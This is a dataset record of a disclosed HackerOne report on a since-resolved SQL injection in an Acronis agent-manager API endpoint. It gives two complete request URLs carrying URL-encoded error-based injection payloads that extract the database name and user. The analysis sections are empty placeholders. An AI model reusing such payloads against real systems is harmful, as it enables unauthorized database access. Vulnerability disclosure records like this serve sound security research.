---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '962889'
original_report_id: '962889'
title: SQL Injection in agent-manager
weakness: SQL Injection
team_handle: acronis
created_at: '2020-08-20T02:36:05.020Z'
disclosed_at: '2021-08-16T09:37:25.718Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 225
asset_identifier: '*.acronis.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- sql-injection
---

# SQL Injection in agent-manager

## Metadata

- HackerOne Report ID: 962889
- Weakness: SQL Injection
- Program: acronis
- Disclosed At: 2021-08-16T09:37:25.718Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

1.https://mc-beta-cloud.acronis.com/api/agent_manager/v2/unit_configurations?name=update-schedule&no_data=false&tenant_id=1590228&unit=atp-agent%27and%2F%2A%2A%2Fextractvalue%281%2Cconcat%28char%28126%29%2C%28select+database%28%29%29%29%29and%27
2.https://mc-beta-cloud.acronis.com/api/agent_manager/v2/unit_configurations?name=update-schedule&no_data=false&tenant_id=1590228&unit=atp-agent%27and%2F%2A%2A%2Fextractvalue%281%2Cconcat%28char%28126%29%2C%28select+user%28%29%29%29%29and%27

## Impact

sql injection

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
